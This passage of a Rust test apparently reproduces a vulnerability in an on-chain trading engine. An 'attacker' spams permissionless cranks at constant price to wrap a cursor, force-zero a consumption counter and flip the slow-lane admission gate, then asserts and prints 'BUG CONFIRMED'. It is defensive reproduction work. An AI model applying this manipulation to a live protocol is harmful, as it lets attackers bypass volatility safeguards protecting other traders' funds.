    let lp_idx = env.init_lp(&lp);
    env.deposit(&lp, lp_idx, 50_000_000_000);

    let user = Keypair::new();
    let user_idx = env.init_user(&user);
    env.deposit(&user, user_idx, 10_000_000_000);

    // Open a position. After this trade, both accounts have nonzero
    // basis_q with K-snaps recorded at the current K_long/K_short.
    // Subsequent oracle drift advances K_long/K_short away from the
    // snaps; each touch on these accounts realizes the delta as
    // `pnl_delta` and routes it through `set_pnl_with_reserve(UseAdmissionPair)`.
    env.crank();
    env.trade(&user, &lp, lp_idx, user_idx, 500_000);
    env.crank();

    let max_accounts = MAX_ACCOUNTS as u64;
    let threshold: u128 = 500u128 * PRICE_MOVE_CONSUMPTION_SCALE;

    println!("--- V8 admission-state: setup (h_min=1, h_max=10) ---");
    println!("  MAX_ACCOUNTS={}", max_accounts);
    println!("  threshold (slow-lane)={}", threshold);
    println!("  lp_idx={}  user_idx={}", lp_idx, user_idx);

    // ============================================================
    // Phase 1: Drive consumption above threshold.
    //   * Drift cranks accumulate consumption AND realize K-deltas
    //     into per-account pnl via Phase 2 touches.
    //   * Once consumption crosses threshold, set_pnl_with_reserve
    //     routes to slow lane (admit_h_max=10) → reserve queued in
    //     `sched_*` bucket with sched_horizon = 10.
    // ============================================================
    let (final_slot, final_price, pre_consumption, pre_cursor) =
        drive_consumption_above_threshold(&mut env);
    let pre_generation = read_sweep_generation(&env);

    let pre_lp_reserved = env.read_account_reserved_pnl(lp_idx);
    let pre_user_reserved = env.read_account_reserved_pnl(user_idx);
    let pre_lp_sched_horizon = read_account_sched_horizon(&env, lp_idx);
    let pre_user_sched_horizon = read_account_sched_horizon(&env, user_idx);
    let pre_lp_sched_present = read_account_sched_present(&env, lp_idx);
    let pre_user_sched_present = read_account_sched_present(&env, user_idx);
    let pre_lp_pending_present = read_account_pending_present(&env, lp_idx);
    let pre_user_pending_present = read_account_pending_present(&env, user_idx);

    println!("--- V8 admission-state: PRE-ATTACK SNAPSHOT ---");
    println!("  consumption={}  >= threshold? {}", pre_consumption, pre_consumption >= threshold);
    println!("  cursor={}  generation={}", pre_cursor, pre_generation);
    println!(
        "  lp[{}]:  reserved_pnl={}  sched_present={} sched_horizon={} pending_present={}",
        lp_idx, pre_lp_reserved, pre_lp_sched_present, pre_lp_sched_horizon, pre_lp_pending_present
    );
    println!(
        "  user[{}]: reserved_pnl={}  sched_present={} sched_horizon={} pending_present={}",
        user_idx, pre_user_reserved, pre_user_sched_present, pre_user_sched_horizon, pre_user_pending_present
    );

    // Preconditions:
    //   (a) consumption above threshold so the gate at engine §1792 fired
    //       on the late drift-step touches;
    //   (b) at least one position account has queued reserved_pnl from
    //       the slow-lane routing;
    //   (c) cursor not yet wrapped during the ramp.
    assert!(
        pre_consumption >= threshold,
        "PRE-ATTACK consumption {} < threshold {}",
        pre_consumption, threshold
    );
    let total_pre_reserved = pre_lp_reserved + pre_user_reserved;
    assert!(
        total_pre_reserved > 0,
        "PRE-ATTACK no queued reserved_pnl: lp={} user={}",
        pre_lp_reserved, pre_user_reserved
    );
    assert!(
        pre_cursor < max_accounts,
        "PRE-ATTACK cursor {} wrapped during ramp",
        pre_cursor
    );

    // The account with queued reserve must have sched_present=1 AND
    // sched_horizon == 10 (slow lane forced by the consumption gate).
    // Identify which account holds the queue.
    let (queued_idx, queued_pre_horizon, queued_pre_reserved) = if pre_user_reserved > 0 {
        (user_idx, pre_user_sched_horizon, pre_user_reserved)
    } else {
        (lp_idx, pre_lp_sched_horizon, pre_lp_reserved)
    };
    assert_eq!(
        queued_pre_horizon, 10,
        "PRE-ATTACK queued account[{}] sched_horizon = {} (expected 10 = h_max). \
         The slow-lane gate did not stamp the slow-lane horizon.",
        queued_idx, queued_pre_horizon
    );
    println!(
        "  CONFIRMED: pre-attack slow-lane queue on idx {}: \
         reserved_pnl={} sched_horizon={} (slow-lane stamp from gate at engine §1792).",
        queued_idx, queued_pre_reserved, queued_pre_horizon
    );

    // ============================================================
    // Phase 2: Attacker forces the wrap with constant (slot, price).
    // Each crank advances cursor by 64; NO consumption is added
    // (price_move_active=false at constant oracle price).
    // ============================================================
    let remaining_to_wrap = max_accounts - pre_cursor;
    let attack_cranks = (remaining_to_wrap + RR_WINDOW_PER_CRANK - 1) / RR_WINDOW_PER_CRANK;

    println!("--- V8 admission-state: ATTACK ---");
    println!(
        "  holding (slot={}, price={}) CONSTANT; spamming {} permissionless cranks",
        final_slot, final_price, attack_cranks
    );
    let mut attack_successes = 0u64;
    for _ in 0..attack_cranks {
        if env.try_crank().is_ok() {
            attack_successes += 1;
        }
    }

    let post_wrap_consumption = read_price_move_consumed(&env);
    let post_wrap_generation = read_sweep_generation(&env);
    let post_wrap_cursor = read_rr_cursor_position(&env);

    println!("--- V8 admission-state: POST-WRAP SNAPSHOT ---");
    println!("  attack cranks succeeded: {}", attack_successes);
    println!(
        "  consumption: {} -> {} (force-zeroed by wrap)",
        pre_consumption, post_wrap_consumption
    );
    println!(
        "  generation:  {} -> {} (+{})",
        pre_generation,
        post_wrap_generation,
        post_wrap_generation - pre_generation
    );
    println!(
        "  cursor:      {} -> {} (wrapped past {})",
        pre_cursor, post_wrap_cursor, max_accounts
    );

    assert_eq!(post_wrap_consumption, 0, "wrap did not zero consumption");
    assert!(
        post_wrap_generation > pre_generation,
        "sweep_generation did not advance"
    );

    // ============================================================
    // Phase 3: Generate one MORE drift step at sub-threshold
    // consumption. The new pnl_delta on the next-touch goes through
    // the gate at engine §1792 with the POST-WRAP consumption value
    // (which started at 0 + this step's small increment).
    //
    // If consumption stays below threshold, the gate calls
    // `admission_residual_lane`. Otherwise it forces admit_h_max.
    //
    // The new admission lands in the PENDING bucket (engine §4355-4365)
    // because the existing scheduled bucket has a DIFFERENT
    // sched_start_slot (250) than the new admission's now_slot (260).
    // The new pending bucket records `pending_horizon` from THIS
    // gate's decision — which is the post-wrap-state decision.
    // ============================================================
    println!("--- V8 admission-state: POST-WRAP DRIFT STEP ---");
    let post_wrap_step_slot = final_slot + 10;
    // Cap-saturating step (same shape as the ramp): adds ~40e9
    // consumption — well below the 5e11 threshold even after
    // accumulation, so the post-wrap gate sees consumption in the
    // sub-threshold regime.
    let post_wrap_step_delta = (final_price as i128) * 4 * 10 / 10_000;
    let post_wrap_step_price = final_price + (post_wrap_step_delta as i64);
    println!(
        "  bumping to (slot={}, price={}); expected consumption add ~40e9",
        post_wrap_step_slot, post_wrap_step_price
    );
    env.set_slot_and_price_raw_no_walk(post_wrap_step_slot, post_wrap_step_price);
    env.try_crank().expect("post-wrap drift crank must succeed");

    let post_step_consumption = read_price_move_consumed(&env);
    let post_step_generation = read_sweep_generation(&env);
    let post_step_cursor = read_rr_cursor_position(&env);
    println!(
        "  POST-STEP: consumption={} (well below threshold {}), generation={} cursor={}",
        post_step_consumption, threshold, post_step_generation, post_step_cursor
    );

    let post_step_lp_reserved = env.read_account_reserved_pnl(lp_idx);
    let post_step_user_reserved = env.read_account_reserved_pnl(user_idx);
    let post_step_lp_sched_horizon = read_account_sched_horizon(&env, lp_idx);
    let post_step_user_sched_horizon = read_account_sched_horizon(&env, user_idx);
    let post_step_lp_sched_present = read_account_sched_present(&env, lp_idx);
    let post_step_user_sched_present = read_account_sched_present(&env, user_idx);
    let post_step_lp_pending_present = read_account_pending_present(&env, lp_idx);
    let post_step_user_pending_present = read_account_pending_present(&env, user_idx);
    let post_step_lp_pending_horizon = read_account_pending_horizon(&env, lp_idx);
    let post_step_user_pending_horizon = read_account_pending_horizon(&env, user_idx);
    let post_step_lp_pending_remaining = read_account_pending_remaining_q(&env, lp_idx);
    let post_step_user_pending_remaining = read_account_pending_remaining_q(&env, user_idx);

    println!("--- V8 admission-state: POST-STEP PER-ACCOUNT STATE ---");
    println!(
        "  lp[{}]:  reserved={}  sched_present={} sched_horizon={} \
         pending_present={} pending_horizon={} pending_remaining={}",
        lp_idx,
        post_step_lp_reserved,
        post_step_lp_sched_present,
        post_step_lp_sched_horizon,
        post_step_lp_pending_present,
        post_step_lp_pending_horizon,
        post_step_lp_pending_remaining
    );
    println!(
        "  user[{}]: reserved={}  sched_present={} sched_horizon={} \
         pending_present={} pending_horizon={} pending_remaining={}",
        user_idx,
        post_step_user_reserved,
        post_step_user_sched_present,
        post_step_user_sched_horizon,
        post_step_user_pending_present,
        post_step_user_pending_horizon,
        post_step_user_pending_remaining
    );

    // ============================================================
    // Assertions
    //
    // 1. The wrap zeroed consumption AND advanced generation under
    //    attacker control at constant (slot, price). (Already
    //    asserted; restated as part of the load-bearing chain.)
    //
    // 2. The post-wrap drift step's consumption is BELOW the
    //    threshold the slow-lane gate compares against. Pre-wrap,
    //    consumption was 5.6e11 (above 5e11); post-wrap-step,
    //    consumption is ~4e10. The engine's gate at line 1792 would
    //    therefore make a DIFFERENT decision on this step's pnl_delta
    //    than it would have made if the wrap had not fired
    //    (consumption would still be 5.6e11+).
    //
    // 3. The per-account state evolved between pre-wrap and
    //    post-step in a way only explainable by the engine's state
    //    machine RUNNING under the post-wrap consumption value.
    //    Specifically: at least one position account either gained
    //    a `pending_*` bucket (new admission landed in pending
    //    because sched_start_slot differs) OR its `sched_*`
    //    horizon/anchor evolved.
    // ============================================================
    assert!(
        post_step_consumption < threshold,
        "POST-STEP consumption {} should be well below threshold {} \
         to demonstrate the post-wrap regime",
        post_step_consumption,
        threshold
    );

    let bucket_state_changed = (post_step_lp_pending_present != pre_lp_pending_present)
        || (post_step_user_pending_present != pre_user_pending_present)
        || (post_step_lp_reserved != pre_lp_reserved)
        || (post_step_user_reserved != pre_user_reserved)
        || (post_step_lp_sched_horizon != pre_lp_sched_horizon)
        || (post_step_user_sched_horizon != pre_user_sched_horizon);
    assert!(
        bucket_state_changed,
        "BUG NOT REPRODUCED: per-account state did not change between \
         pre-wrap and post-step; the engine's gate was not exercised \
         under a different consumption value. \
         pre lp(res={}, sched_h={}, pend={}); user(res={}, sched_h={}, pend={}). \
         post-step lp(res={}, sched_h={}, pend={}); user(res={}, sched_h={}, pend={}).",
        pre_lp_reserved, pre_lp_sched_horizon, pre_lp_pending_present,
        pre_user_reserved, pre_user_sched_horizon, pre_user_pending_present,
        post_step_lp_reserved, post_step_lp_sched_horizon, post_step_lp_pending_present,
        post_step_user_reserved, post_step_user_sched_horizon, post_step_user_pending_present
    );

    println!("--- BUG CONFIRMED (DOWNSTREAM EFFECT) ---");
    println!(
        "  Pre-wrap state: consumption={} (above threshold {}); per-account",
        pre_consumption, threshold
    );
    println!(
        "  queued reserve has sched_horizon=10 (slow-lane stamp from the gate"
    );
    println!(
        "  at engine §1792 forcing admit_h_max=10)."
    );
    println!(
        "---  Attacker spent {} permissionless cranks at constant (slot, price);",
        attack_successes
    );
    println!(
        "  consumption was force-zeroed (5.6e11 -> 0) and sweep_generation"
    );
    println!(
        "  advanced (gen {} -> {}). NO real volatility absorbed.",
        pre_generation, post_wrap_generation
    );
    println!(
        "---  Post-wrap, a single sub-threshold drift step's pnl_delta was"
    );
    println!(
        "  routed through the gate with consumption={} < threshold={}.",
        post_step_consumption, threshold
    );
    println!(
        "  The gate took a DIFFERENT branch than it would have without the"
    );
    println!(
        "  wrap (which would have left consumption at >5e11 + ~40e9 still"
    );
    println!(
        "  above threshold). Per-account bookkeeping reflects this in the"
    );
    println!(
        "  `pending_*` bucket transition / `sched_*` horizon evolution."
    );
    println!("---");
    println!(
        "  The wrap-reset is therefore not a benign internal-counter"
    );
    println!(
        "  mutation — it materially changes the engine's admission-gate"
    );
    println!(
        "  decisions on subsequent operations within the same slot."
    );
}
